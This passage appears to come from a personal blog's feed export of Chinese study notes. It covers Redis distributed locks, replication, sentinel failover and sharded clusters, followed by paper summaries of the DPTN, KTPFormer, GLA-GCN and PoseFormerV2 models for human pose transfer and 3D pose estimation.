src="/2025/02/07/redis/%E8%8E%B7%E5%8F%96%E9%94%81%E9%87%8A%E6%94%BE%E9%94%81.png" title="获取锁释放锁"></p><p><img src="/2025/02/07/redis/%E9%94%81%E6%B5%81%E7%A8%8B.png" title="锁流程"></p><p><img src="/2025/02/07/redis/redission%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B.png" title="分布式锁流程"></p><p>重点：<br><br>1、Watch dog可以给锁续期<br><br>2、抢不到锁的线程会进行尝试等待<br><br>3、所有的redis命令是由lua脚本完成的，保证执行的原子性<br></p><p><img src="/2025/02/07/redis/redission%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E5%8F%AF%E9%87%8D%E5%85%A5.png" title="redission的分布式锁可重入"></p><p>KEY是锁的名称，field是持有锁线程的唯一标识,value存储当前线程锁的次数</p><p><img src="/2025/02/07/redis/redisson%E5%AE%9E%E7%8E%B0%E4%B8%BB%E4%BB%8E%E4%B8%80%E8%87%B4.png" title="redisson实现主从一致"></p><h2 id="Redis集群"><a href="#Redis集群" class="headerlink" title="Redis集群"></a>Redis集群</h2><p>在Redis中提供的集群方案有三种：主从复制、哨兵模式、分片集群</p><p><img src="/2025/02/07/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6.png" title="主从复制"></p><h3 id="主从数据同步原理"><a href="#主从数据同步原理" class="headerlink" title="主从数据同步原理"></a><font color="#F000">主从数据同步原理</font></h3><p>主从<font color="#F00">全量同步</font>：</p><p><img src="/2025/02/07/redis/%E4%B8%BB%E4%BB%8E%E5%85%A8%E9%87%8F%E5%90%8C%E6%AD%A5.png" title="主从全量同步"></p><p><font color="#F00">Replication Id</font>:简称replid，是数据集的标记，id一致则说明是同一数据集。每个master都有唯一的replid，slave则会继承master节点的replid。<br><br><font color="#F00">offset</font>:偏移量，随着记录在repl_baklog中的数据增多而逐渐增大。slave完成同步时也会记录当前同步的offset。如果slave的offset小于master的offset，说明slave数据落后于master，需要更新。</p><p><img src="/2025/02/07/redis/%E4%B8%BB%E4%BB%8E%E5%A2%9E%E9%87%8F%E5%90%8C%E6%AD%A5.png" title="主从增量同步"></p><h3 id="哨兵模式"><a href="#哨兵模式" class="headerlink" title="哨兵模式"></a><font color="#F000">哨兵模式</font></h3><p><font color="#F00">哨兵的作用</font><br>Redis提供了哨兵(Sentinel)机制来实现主从集群的自动故障恢复。哨兵的结构和作用如下：</p><p><img src="/2025/02/07/redis/%E5%93%A8%E5%85%B5%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%9C%E7%94%A8.png" title="哨兵的结构作用"></p><p>(1)<strong>监控</strong>：Sentinel会不断检查你的master和slave是否按预期工作。</p><p>(2)<strong>自动故障恢复</strong>：如果master故障，Sentinel会将一个slave提升为master。当故障实例恢复后也以新的master为主。</p><p>(3)<strong>通知</strong>：Sentinel充当Redis客户端的服务发现来源，当集群发生故障转移时，会将最新信息推送给Redis的客户端。</p><p>Sentinel基于心跳机制监测服务状态，每个1秒向集群的每个实例发送ping命令：<br><br>主观下线：如果某Sentinel节点发现某实例未在规定时间响应，则认为该实例<strong>主观下线</strong>。<br><br>客观下线：若超过指定数量(quorum)的sentinel都认为该实例主观下线，则该实例<strong>客观下线</strong>。quorum值最好超过Sentinel实例数量的一半。<br></p><p><strong>哨兵选主规则</strong><br><br>1、首先判断主与从节点断开时间长短，如超过指定值就该从节点<br><br>2、然后判断从节点的slave-prority值，越小优先级越高<br><br>3、<font color="#F00">如果slave-prority一样，则判断slave节点的offset值，越大优先级越高</font><br><br>4、最后判断slave节点的运行id大小，越小优先级越高。</p><p><img src="/2025/02/07/redis/%E8%84%91%E8%A3%82.png" title="脑裂"></p><p>假如，由于网络原因，主节点master还有哨兵都处于不同的网络分区，哨兵只能去监测从节点监测不到主节点了。这时候哨兵会按照选举的规则，<br>从从节点中选出一个节点当作主节点。但旧的主节点还没有挂掉，客户端还能正常连接，这时候就出现了两个master，这就是脑裂现象。问题是，客户端会持续往旧的master中写入数据，新的节点不能同步数据。假如<br>现在网络恢复了，哨兵会把旧的master强制降为slave。这时候这个slave会从master中去同步数据，它会自己的数据清空，但是在之前的脑裂过程中客户端写入的数据就丢失了。</p><p><img src="/2025/02/07/redis/%E8%84%91%E8%A3%82%E9%97%AE%E9%A2%98.png" title="脑裂的问题"></p><p>解决方法：<br><img src="/2025/02/07/redis/%E8%84%91%E8%A3%82%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.png" title="脑裂的解决方法"></p><p><strong>解决</strong>：我们可以修改redis的配置，可以设置最少的从节点数量以及缩短主从数据同步的延迟时间，达不到要求就拒绝请求，就可以避免大量的数据丢失</p><h3 id="分片集群结构"><a href="#分片集群结构" class="headerlink" title="分片集群结构"></a><font color="#F00">分片集群结构</font></h3><p>主从和哨兵可以解决高可用、高并发读的问题。但是依然有两个问题没有解决：<br><br>1、海量数据存储问题<br><br>2、高并发写的问题<br></p><p>使用分片集群可以解决上述问题，分片集群特征：<br>1、集群中又多个master，每个master保存不同数据<br>2、每个master都可以有多个slave节点<br>3、master之间通过ping监测彼此健康状态<br>4、客户端请求可以访问集群任意节点，最终都会被转发到正确节点</p><p><img src="/2025/02/07/redis/%E5%88%86%E7%89%87%E9%9B%86%E7%BE%A4.png" title="分片集群"></p><p>Redis分片集群引入了哈希槽的概念，Redis集群有16384个哈希槽，每个key通过CRC16校验后对16384取模来决定放置哪个槽，集群的每个节点负责一部分hash槽</p><p><img src="/2025/02/07/redis/%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%86%99.png" title="分片集群数据读写"></p><p>Redis是单线程的，之所以快的原因如下：<br><br>1、Redis是纯内存操作，执行速度非常快<br>2、采用单线程，避免不必要的上下文切换可竞争条件，多线程还要考虑线程安全问题<br>3、使用I&#x2F;O多路复用模型，非阻塞IO</p><p>Redis是纯内存操作，执行速度非常快，它的性能瓶颈是<font color="#F00">网络延迟</font>而不是执行速度，I&#x2F;O多路复用模型主要就是实现了高效的网络请求</p><p><img src="/2025/02/07/redis/%E7%94%A8%E6%88%B7%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4.png" title="用户空间和内核空间"></p><p><img src="/2025/02/07/redis/%E9%98%BB%E5%A1%9EIO.png" title="阻塞IO"></p><p><img src="/2025/02/07/redis/%E9%9D%9E%E9%98%BB%E5%A1%9EIO.png" title="非阻塞IO"></p><p><strong>IO多路复用</strong>：是利用单个线程来同时监听多个Socket，并在某个Socket可读、可写时得到通知，从而避免无效的等待，充分利用CPU资源。</p><p><img src="/2025/02/07/redis/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8.png" title="IO多路复用"></p><p>不过监听Socket的方式、通知的方式又有很多种实现，常见的有：<br>select、poll、epoll</p><p>差异：<br><br>1、select和poll只会通知用户进程有Socket就绪，但不确定具体是哪个Socket，需要用户进程逐个遍历Socket来确认<br><br>2、epoll则会在通知用户进程Socket就绪的同时，把已就绪的Socket写入用户空间</p><h3 id="Redis网络模型"><a href="#Redis网络模型" class="headerlink" title="Redis网络模型"></a>Redis网络模型</h3><p>Redis通过IO多路复用来提高网络性能，并且支持各种不同的多路复用实现，并且将这些实现进行封装，提供了统一的高性能事件库</p><p><img src="/2025/02/07/redis/Redis%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B.png" title="Redis网络模型"></p><h2 id="Redis数据结构"><a href="#Redis数据结构" class="headerlink" title="Redis数据结构"></a>Redis数据结构</h2><p>Redis提供了丰富的数据结构类型，常见的有五种数据类型：<font color="#05F">String(字符串)，Hash(哈希)，List(列表)，Set(集合)、Zset(有序集合)</font><br></p><p><img src="/2025/02/07/redis/Redis%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" title="Redis数据结构"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dual-task pose transfer</title>
    <link href="/2024/10/21/Dual-task-pose-transfer/"/>
    <url>/2024/10/21/Dual-task-pose-transfer/</url>
    
    <content type="html"><![CDATA[<p><strong>##文章背景：</strong>姿态引导的人物图像生成(PGPIG)是将人物图像从源姿态变换为给定的目标姿态的任务。<br><br><strong>提出问题：</strong>现有方法大多关注的是源到目标的不适定任务，无法捕捉到合理的纹理映射。<br></p><p><strong>提出方法</strong>本文提出了一种新的双任务位姿Transformer网络(DPTN),并利用双任务的相关性来提高PGPIG的性能。<br><br><br></p><p>##文章要点<br>DPTN是一个连体结构,包括两个分支:一个selfreconstruction分支的辅助源到源的任务和转换分支的源到目标的任务。<br>这两个分支共享部分权重,并同时使用不同的损失函数进行训练。通过这种方式,源到源任务所学习的知识可以直接辅助源到目标任务的优化。<br>为了探索双任务之间的相关性,我们用一种新的姿态Transformer模块(PTM)来桥接这两个分支。我们的PTM由几个上下文增强块(CAB)和纹理传输块(TTB)。CAB首先有选择地收集源到源任务的信息。<br>然后TTB逐渐捕获来自双重任务的特征之间的细粒度相关性。在这种相关性的帮助下,TTB可以有效地促进从真实的源图像到源到目标任务的纹理传输,使得合成图像能够保留更多的源外观细节。</p><p><img src="/2024/10/21/Dual-task-pose-transfer/DPTN.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>KTPFormer</title>
    <link href="/2024/06/13/KTPFormer/"/>
    <url>/2024/06/13/KTPFormer/</url>
    
    <content type="html"><![CDATA[<p><strong>提出问题：</strong>现有基于Transformer的三维人体姿态估计方法克服了现有基于transformer的三维人体姿态估计方法中自注意机制中Q、K、V向量的推导都是基于简单线性映射的缺点。<br>（无论是空间还是时间MHSA计算，目前基于变换的方法都使用线性嵌入，其中2D姿态序列被标记为高维特征并统一处理，以分别计算空间和时间MHSA中关节之间的空间相关性和跨帧的时间相关性。导致“注意力分散”的问题，这是一种表示自我注意力过于集中在输入标记的有限子集上而忽视序列的其他片段的情况的现象。）</p><p><strong>提出方法：</strong>提出了一种新的基于运动学和轨迹先验知识的增强型Transformer（KTPFormer）算法，克服了现有基于transformer的三维人体姿态估计方法中自注意机制中Q、K、V向量的推导都是基于简单线性映射的缺点。</p><p>提出了两个先验注意模块，即运动学先验注意（KPA）和轨迹先验注意（TPA），利用已知的人体解剖结构和运动轨迹信息，促进对多头自注意中全局依赖关系和特征的有效学习。KPA通过构建运动学拓扑来建模人体的运动学关系，TPA通过构建轨迹拓扑来学习跨帧关节运动轨迹信息。这两个模块利用先验知识生成Q、K、V向量，使KTPFormer能够同时对空间和时间相关性进行建模。</p><p><img src="/2024/06/13/KTPFormer/%E6%97%B6%E9%97%B4%E7%A9%BA%E9%97%B4%E6%8B%93%E6%89%91.png"><br><strong>图1</strong><br>引入了两个新的先验注意模块，即运动先验注意（KPA）和轨迹先验注意（TPA），关键概念如图1所示。KPA首先根据人体解剖构造一个空间局部拓扑，如图1顶部所示。这些关节彼此物理连接的方式是固定的，并由实线表示。为了引入非连接关节之间的运动学关系，我们使用完全连接的空间拓扑来计算关节到关节的注意力权重，称为模拟空间全局拓扑。在这个拓扑中，每个关节（包括自身）之间的连接关系的强度是可学习的，因此我们在图1中用虚线表示。</p><p>将空间局部拓扑和模拟的空间全局拓扑相结合，以获得运动学拓扑，其中每个关节彼此之间具有可学习的运动学关系。该运动学拓扑信息旨在为空间MHSA提供先验知识，使其能够基于不同动作中的运动学关系为关节分配权重。类似地，如图1底部所示，TPA跨连续帧连接同一关节，以构建时间局部拓扑。接下来，我们通过利用可学习向量（虚线）连接所有相邻帧和非相邻帧之间的关节来构建时间全局拓扑，这相当于通过自注意计算所有帧之间的注意力权重，称为模拟时间全局拓扑。</p><p>然后，将这两种拓扑组合起来，获得一种称为关节运动轨迹拓扑的新拓扑，它允许网络学习关节运动的时间序列性和周期性（非相邻帧中的关节具有彼此相似的运动）。嵌入轨迹信息的时间标记将在时态MHSA中更有效地激活，这增强了MHSA的时间建模能力。KPA和TPA模块与普通MHSA和MLP相结合，形成用于3D姿态估计的运动学和轨迹先验知识增强转换器（KTPFormer），如图2所示。</p><p><strong>文章要点</strong></p><p><img src="/2024/06/13/KTPFormer/KTPFormer.png"><br><strong>图2</strong></p><p>如图2所示，首先将输入2D姿势序列PTN∈RT×N×2送入运动学增强转换器，其中T表示帧的数量，N表示关节的数量，2表示通道的大小。KPA在每一帧中将运动学拓扑信息注入到2D姿势PN∈RN×2中，目的是获得高维空间标记HTN∈RT×N×dm。接下来，空间MHSA将HTN转换为矩阵QS、KS、VS，以学习关节之间的全局相关性。轨迹增强型Transformer将一系列重塑的令牌PnT∈RN×T×dm作为输入。我们将两个带有残差连接的TPA块堆叠在一起，生成包含关节运动轨迹先验信息的时间令牌HNT∈RN×T×dm。接下来，时间MHSA将HNT转换为Qt、Kt、Vt，用于建模帧之间的全局一致性。对时间MHSA的输出特征进行整形，并将其馈送到堆叠的时空变换中进行编码。最后，回归头基于学习的特征预测3D姿势序列的坐标。</p><p><strong>运动学增强型变压器</strong><br>运动学增强的Transformer接收输入的2D关键点序列，并将其转换为高维空间标记。2D关键点序列首先通过KPA嵌入运动学先验知识，然后将其送入空间MHSA进行关节间的全局相关性学习。</p><p><strong>轨迹增强型Transformer</strong><br>轨迹增强Transformer旨在将关节跨帧运动的先验轨迹信息集成到一个标记序列PNT∈RN×T×dm中，其中每个关节在时间维度上被视为一个单独的标记。TPA首先在相邻帧之间连接相同的关键点（包括其自身），以构建时间局部拓扑，如图1所示，定义为对称亲和力矩阵AT∈RT×T。为了增强MHSA中时间一致性的全局关注度，我们模拟了一种考虑相邻和非相邻帧之间隐含时间相关性的时间全局拓扑。这些属于相邻和非相邻帧之间相同轨迹的关键点通过可学习向量(虚线)连接起来，形成模拟的时间全局拓扑，如图1所示。</p><p><strong>堆叠式时空编码器</strong><br>经过整形后，HST被送入由交替的空间和时间变换组成的堆叠式时空编码器。堆栈的数量为L。在馈入编码器(空间或时间)之前，根据MHSA的类型对顺序特征进行重塑。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GLA_GCN</title>
    <link href="/2024/05/29/GLA-GCN/"/>
    <url>/2024/05/29/GLA-GCN/</url>
    
    <content type="html"><![CDATA[<p><strong>提出问题：</strong>现有的位姿提升工作主要集中在提高估计位姿的性能上，但在地面真实位姿数据上测试时往往表现不佳。</p><p><strong>文章目标：</strong>通过观察得知，通过准备高质量的2D姿态，例如微调2D姿态或使用高级2D姿态检测器，可以很容易地提高估计姿态的性能。因此，专注于通过地面真实数据来改进3D人体姿势提升，以便将来改进更多质量的估计姿势数据。</p><p><strong>提出方法：</strong>本文提出了一种简单而有效的全局-局部自适应图卷积网络（GLA-GCN）模型。文章的GLA-GCN通过图表示和回溯局部关节特征对时空结构进行全局建模，用于通过单独连接的层进行3D人体姿态估计。</p><p>不同姿态关节的估计依赖于同一个全连通层，缺乏考虑不同姿态关节的独立性。另一方面，基于GCN的模型可以在卷积传播期间显式地保留2D和3D人体姿势的结构。然而，GCN的这一优势仍未得到充分探索。现有的基于GCN的方法还利用全连接层来估计不同的3D姿态关节，其不考虑GCN表示的结构特征。</p><p><strong>文章要点：</strong><br><strong>GLA-GCN包含两个模块：全局表示和局部3D姿态估计</strong><br>在全局表示中，文章使用自适应的图卷积网络（GCN）来根据对应的2D序列重建中间3D人体姿态序列的全局表示。对于局部3D姿态关节点的估计，文章通过步长设计将经过重建的3D姿态序列优化后的全局表示进行时间上的缩减。接着，文章提出了一个独立的连接层，用于从缩减后的全局表示中局部估计3D人体姿态关节点。</p><p><img src="/2024/05/29/GLA-GCN/GLA-GCN%E6%A1%86%E6%9E%B6.png"><br><strong>图1</strong><br>GLA-GCN架构。AGCN（Cin，Cout，S）表示具有输入通道、输出通道和步幅长度的特定值的AGCN块。F（C′，T′，N′）表示特征图的大小。单个连接层显示了使用单独的1D CNN层的四个姿势联合示例的预测过程。</p><p><strong>自适应图卷积网络</strong>AGCN块基于GCN，具有自适应设计，提高了典型ST-GCN块的灵活性。<br>    为了实现基本ST-GCN块，首先定义相邻集合Bi以指示用于特定姿态联合的空间图形卷积滤波器B1，i。具体来说，对于顶点节点的图卷积滤波器，我们应用三个距离邻居子集：顶点本身，向心子集和离心子集。向心和离心子集的定义基于姿势帧的重心（即，所有姿势关节的平均坐标）。</p><p>向心和离心子集分别表示离重心的平均距离更近和更远的节点。经验上，与2D卷积类似，将内核大小K设置为3，这将导致Bi中的3个子集。为了实现子集，映射ht，i → {0，.K − 1}用于用数字标签索引每个子集，其中向心和离心子集分别标记为1和2。具有到重心的平均距离的子集索引为0。</p><p><img src="/2024/05/29/GLA-GCN/%E5%9B%BE%E5%8D%B7%E7%A7%AF%E8%BF%90%E7%AE%97.png"></p><p>Vt,j → R2是得到关节节点Vt,j的属性特征的映射，Zt,j是等于子集的基数的归一化项。对于姿态帧，采样策略（例如，向心和离心子集）可以通过N×N邻接矩阵来实现。</p><p><img src="/2024/05/29/GLA-GCN/%E5%9B%BE%E5%8D%B7%E7%A7%AF%E5%8F%98%E6%8D%A2.png"></p><p>Ck执行与Bk类似的功能，其通过由嵌入函数计算的两个特征图的点积来实现（即，θ和θ）来计算姿势关节之间的相似性。Ck的计算可以表示为：</p><p><img src="/2024/05/29/GLA-GCN/Ck%E8%A1%A8%E7%A4%BA.png"></p><p>其中W θ和W ∅是两个嵌入函数的可学习参数，初始化为0.0。然后，AGCN块用1 × Γ经典2D卷积层（Γ是我们设置为9的时间内核大小）和定义的自适应图卷积fout（fout）来实现，这两个层后面都是批归一化层和ReLU层，以及它们之间的dropout层。同时，将剩余连接添加到AGCN块。</p><p><strong>重建3D姿态序列</strong><br>使用引入的AGCN块来提取全局图表示中的时空结构信息，通过从相应的2D序列估计3D姿态序列来监督该信息。</p><p>每个AGCN块具有三个关键参数：输入通道的数量Cin、输出通道的数量Cout和时间卷积的步幅S，而其他参数保持一致（例如，时间卷积核大小是3）。给定输入Cin-dim姿态表示F（Cin，Tin，N），AGCN块经由对姿态结构序列的卷积来导出输出Cout-dim姿态F（Cout，Tout，N），其中Tout取决于Nin和S。为了重建3D姿态序列，我们首先使用AGCN（2，96，1）将2D姿态序列F（2，T，N）转换为96 D姿态表示F（96，T，N）。根据相关工作的设置，将Human3.6M数据集的T设置为243，N设置为17。也就是说，输入的2D姿态序列F（2，243，17）被转换成96 D姿态序列F（96，243，17）。然后，堆叠AGCN（96，96，1）的迭代层，以构建96维姿态序列的深时空结构表示。最后一个AGCN块的输出被馈送到AGCN（96，3，1）中，以基于96 D联合表示来估计3D姿态序列并导出F（3，243，17）。然后，我们让pt，i ∈ R3是在时间t的第i个关节的3D位置，并且最小化所估计的3D姿态序列与地面实况3D姿态序列之间的差：</p><p><img src="/2024/05/29/GLA-GCN/%E6%9C%80%E5%B0%8F%E5%8C%96%E4%BC%B0%E8%AE%A1%E7%9A%84%E5%A7%BF%E6%80%81%E5%BA%8F%E5%88%97%E4%B8%8E%E5%AE%9E%E5%86%B5%E7%9A%84%E5%B7%AE.png"></p><p><strong>跨越式学习框架</strong><br>使用跨步卷积来减少长时间序列并在时间t附近聚合时间信息以进行姿态估计。图1中的灰色模块（跨越式学习）说明了跨越式AGCN模块的设计。每个跨AGCN模块有两个连续的AGCN块，它们被剩余连接包围。在每个跨步AGCN模块的第二个AGCN块处执行跨步卷积，以逐渐缩小时间维度上的特征大小。</p><p>第一跨步AGCN模块的输入是3D姿态序列重建中的中间输出，即，提取的F（96，243，17）。在通过第一个跨步AGAN模块传播之后，96D姿态序列将收缩为F（96，81，17）。然后，重复执行子序列AGCN层，直到特征尺寸缩小到96 × 1 × 17。以这种方式，姿态序列中的时间邻居的模式将被聚合用于后续的局部3D姿态联合估计，以估计中心时间步的3D姿态。</p><p><strong>局部3D姿态联合估计</strong><br>基于上述跨越的AGCN模块，表示为F（96，243，17）的输入2D姿态序列可以被变换为特征图F（96，1，17）。下一步是基于特征图估计关节节点的3D位置。</p><p><strong>单独连接层</strong><br>现有的基于TCN和GCN的方法通常会将导出的特征图平坦化，并使用由所有关节节点组成的全局骨架表示来估计每个关节，忽略关节与特征图中相应向量之间的匹配信息。至关重要的是要在相应的关节节点的空间信息范围内推断其3D位置。本文首先提出了一个单独的连接层来估计每个关节的3D位置基于相应的关节节点特征F（96，1，1），而不是所有关节节点F（96，1，17）的池表示。在数学上，单个连接层可以表示为：</p><p><img src="/2024/05/29/GLA-GCN/%E9%9D%9E%E5%85%B1%E4%BA%AB%E5%8D%95%E4%B8%AA%E8%BF%9E%E6%8E%A5%E5%B1%82.png"></p><p>由于权重Wi和偏置bi在关节之间不共享，我们将上述单独连接层命名为非共享单独连接层。最重要的是，文章发现以非共享方式单独连接的层可能会忽略2D到3D姿势提升中关节之间的共享规则，导致过拟合关节特定分布。因此，进一步设计了共享的单独连接层：</p><p><img src="/2024/05/29/GLA-GCN/%E5%85%B1%E4%BA%AB%E8%BF%9E%E6%8E%A5%E5%B1%82.png"></p><p>共享个体连通层的权参数表示为Ws和Ws ∈ R96×3，其偏置参数表示为bs和bs ∈ R1×3.然后，每个关节的3D姿态估计可以被公式化为来自共享和非共享的单独连接层的估计结果的加权平均：</p><p><img src="/2024/05/29/GLA-GCN/%E5%85%B1%E4%BA%AB%E4%B8%8E%E9%9D%9E%E5%85%B1%E4%BA%AB%E4%BC%B0%E8%AE%A1%E7%BB%93%E6%9E%9C%E5%8A%A0%E6%9D%83%E5%B9%B3%E5%9D%87.png"></p><p>这里，λ是对共享的个体连接层和非共享的个体连接层进行加权的参数。当λ为0.0时，模型仅使用共享的单个连接层进行估计，当λ为1.0时，模型仅使用非共享的单个连接层进行预测。特别是，为了方便起见，本文中通过1D CNN层实现了连接层。最后，希望通过Llocal最小化估计的联合姿态&lt;$pi和地面真实联合姿态pi之间的差异：</p><p><img src="/2024/05/29/GLA-GCN/%E6%9C%80%E5%B0%8F%E4%BC%B0%E8%AE%A1%E8%81%94%E5%90%88%E5%A7%BF%E6%80%81%E4%B8%8E%E7%9C%9F%E5%AE%9E%E5%A7%BF%E6%80%81%E5%B7%AE.png"></p><p>在训练过程中，分两个阶段优化Lglobal和Llocal。在第一阶段，最小化Lglobal + Llocal，使用全局监督信号引导来优化模型。在第二阶段，最小化Llocal以提高3D姿态估计性能。</p><p><strong>数据集</strong><br>我们的实验基于三个公共数据集：Human3.6M ，HumanEva-I 和MPI-INF-3DHP 。对于Human3.6M，受试者S1、S5、S6、S7和S8的数据用于训练，而S9和S11的数据用于测试，这与现有工作的训练和验证设置一致。在HumanEva-I方面，受试者S1、S2和S3的动作“行走”和“慢跑”数据用于训练和测试。对于MPIINF-3DHP，遵循最新技术水平的实验设置进行公平比较。</p><p><strong>评估标准</strong><br>平均每关节位置误差（MPJPE）和姿势对齐MPJPE（P-MPJPE）分别被称为方案#1和方案#2，用于两个数据集。MPJPE的计算基于与根关节对准的预测的3D姿态关节之间的平均欧几里得距离（即，骨盆）和地面实况3D姿态关节通过运动捕捉收集，与MPJPE相比，P-MPJPE也基于平均欧几里得距离，但具有额外的刚性比对后处理步骤（例如，缩放、旋转和平移）到预测的3D姿态。P-MPJPE导致与地面真实值的差异较小，并且遵循。</p><p>遵循中使用的Human3.6M 和HumanEva-I 的2D姿态检测，分别由CPN 和MRCNN 检测。CPN的2D姿态检测具有17个关节，而MRCNN的2D姿态检测具有15个关节。</p><p><strong>提高估计姿态的性能完全依赖于准备高质量的2D姿态数据，这可以通过使用可以生成类似于GT 2D姿态的姿态数据的高级2D姿态检测器或者仅仅任意微调现有姿态检测器来容易地实现。</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PoseFormerV2</title>
    <link href="/2024/05/23/PoseFormerV2/"/>
    <url>/2024/05/23/PoseFormerV2/</url>
    
    <content type="html"><![CDATA[<p><strong>提出问题</strong><br>PoseFormer通过级联transformer层捕捉每个视频帧中人体关节的空间关系和帧之间的人体动力学。然而在实际场景中，PoseFormer及其后续的性能受到两个因素的限制：(A)输入联合序列的长度；(B)2D联合检测的质量。现有的方法通常对输入序列的所有帧都应用自关注，当增加帧数目以获得更高的估计精度时，会造成巨大的计算负担，并且它们对由于2D联合检测器能力有限而带来的自然噪声不具有鲁棒性。（简言之：处理长序列的效率和对不可靠联合检测的鲁棒性）</p><p><strong>提出方法</strong><br>提出了PoseFormerV2，它利用频域中长骨架序列的紧凑表示来有效地放大感受野，并提高对噪声2D联合检测的鲁棒性。提出的方法有效地融合了时域和频域的特征。</p><p>一方面，低频分量足以表示整个视觉标识（例如，图像压缩中的2D图像和这种情况下的关节轨迹），从而消除了对昂贵的全帧自关注的需要;另一方面，骨架序列本身的低频表示滤除了检测到的关节轨迹中包含的高频噪声（抖动和离群值）。</p><p><strong>文章目标：</strong>我们的目标是从频域的角度提高其操作长序列的效率和对噪声联合检测的鲁棒性。</p><p><strong>文章要点</strong><br>利用输入联合序列的频域表示进行2D到3D提升HPE。</p><p>由于人类视觉系统对图像的低频分量更敏感。<br><strong>图像的低频分量指图像中灰度值变化缓慢的区域，即图像中较为平滑的部分，低频分量通常代表图像的总体形状和大致的灰度分布。高频分量则代表图像中的细节、边缘和快速变化的灰度级，如噪声和纹理。</strong></p><p><img src="/2024/05/23/PoseFormerV2/PoseFormerV1.png"><br><strong>图1</strong></p><p>PoseFormerV1的概述。PoseFormerV1主要包括两个模块：空间Transformer编码器和时间Transformer编码器。PoseFormerV1的时间编码器将自注意力应用于给定2D关节序列的所有帧，用于人体运动建模。</p><p>PoseFormerV1由两个主要模块组成，空间编码器用于单帧联合相关建模，时间编码器用于跨帧人体运动建模。给定输入的二维骨架序列x ∈ RF×J×2，其中F表示序列长度，J表示人体表示的关节数。首先，将每个帧中的人的所有关节的坐标线性投影到c维向量（即，联合嵌入）表示为z0 ∈ RF×J×c。将可学习的空间位置嵌入ESPos ∈ R1×J×c 添加到z0以编码联合相关信息。</p><p><strong>空间Transformer编码器</strong><br>利用自注意机制，建立每个帧zi 0 ∈ R1×J×c的联合嵌入空间依赖关系。在该阶段中，馈送到每个Transformer块中的令牌的数量是J。第i帧的L层的空间Transformer编码器的输出由zi L ∈ R1×J×c表示。然后，每帧表示被平坦化并级联为输入Z0 ∈ RF×（J·c）到时间Transformer编码器中。</p><p><strong>时间Transformer编码器</strong><br>类似地，输入Z0与可学习的时间位置嵌入ETPos ∈ RF ×（J·c）相加，以对每个帧的索引相关信息进行编码。具有M个Transformer层的时间编码器密集地对整个序列中的帧到帧的依赖性进行建模，并且其输出由ZM ∈ RF ×（J·c）表示。在此阶段，每个Transformer层的令牌号为F，即输入序列长度。</p><p><strong>回归head</strong><br>为了依次估计中心帧的3D姿态，使用简单的1D卷积来收集时间信息，并且线性投影输出最终姿态表示y ∈ R1×（J·3）。</p><p>由于自我注意力相对于令牌数的二次计算增长（即，空间编码器中的联合数和时间编码器中的序列长度），尤其是当输入序列长度增加时。虽然空间Transformer层的令牌号（即，联合编号）与帧编号无关，但值得注意的是，由于GPU的有限并行化能力，序列长度隐含地影响真实的场景中的空间编码器的计算预算。</p><p><strong>动机</strong><br>文章提出了将输入的骨架序列用离散余弦变换（DCT）变换到频域，并且只利用一部分低频系数。DCT系数对输入时间序列的多个等级的时间信息进行编码。具体地，低频系数编码其粗略轮廓，而高频系数编码其细节，例如，抖动或急剧变化。</p><p>（DCT（离散余弦变换）可能被用于将一维的时间序列信号从时域转换到频域。比如某个关节的角度随时间变化的序列</p><p>首先，我们需要从某种传感器或记录设备中采集到人体姿态信号。这可以是一个时间序列，其中每个时间点对应一个姿态参数（如关节角度）的测量值。</p><p>确保信号是离散的，并且具有适当的采样率和分辨率。对于姿态信号，这通常意味着以一定的频率（如每秒30次）记录关节角度。</p><p>使用DCT算法将一维的时间序列信号从时域转换到频域。DCT是一种实数变换，它类似于离散傅里叶变换（DFT），但在处理实数信号时更为高效。<br>DCT将信号分解为一系列不同频率的正弦波和余弦波的叠加。每个频率分量都有一个对应的DCT系数，该系数表示该频率分量在信号中的强度或重要性。</p><p>在频域中，我们可以分析信号中的频率成分。对于人体姿态信号，这可能意味着识别出与特定动作或姿态模式相关的频率分量。<br>例如，某些动作或姿态可能会导致特定频率的峰值，这些峰值可以用于分类或识别不同的动作或姿态。</p><p>频域分析的结果可以用于改进人体姿态估计模型。例如，通过识别与特定动作相关的频率分量，我们可以训练模型以更准确地检测这些动作。<br>此外，频域分析还可以用于压缩信号或去除噪声，从而提高姿态估计的准确性和鲁棒性。<br>）</p><p><strong>PoseFormerV2</strong><br><img src="/2024/05/23/PoseFormerV2/PoseFormerV2.png"><br><strong>图2</strong></p><p>(a)PoseFormerV 2概述。(b)空间Transformer与时频特征融合Transformer。(c)FreqMLP（频率多层感知器）。为了实现这一点，在（a）中，我们使用3个中心帧（索引-1，0和1）进行细粒度帧级特征提取，并使用全9帧序列的前3个DCT系数进行全局频域特征提取。因此，与PoseFormerV 1相比，输入到空间编码器和时间编码器的帧的有效数量减少了（3，6对9，9）。</p><p><strong>空间transformer编码器</strong><br>给定2D骨架序列x ∈ RF×J×2（优选地是长序列，例如，F是81），我们首先采样F′（通常为F′ 《F）个围绕序列中心的帧（图2（a）中索引为0的帧），用x′ ∈ RF′×J×2表示，作为空间编码器的输入。空间编码器的输出由zTime ∈ RF′×（J·c）（时域中的帧级特征）表示。空间编码器的设计直接遵循PoseFormerV1。</p><p><strong>低频DCT系数</strong><br>zTime被称为“短视”，因为它的感受野（F′）与整个序列长度（F）相比受到限制。为了有效地利用原始序列的长距离人体动态，首先将全序列x ∈ RF×J×2转换为DCT系数，表示为C ∈ RF×J×2。然后对每个联合轨迹进行低通滤波，只保留前N（N，F）个系数C′ ∈ 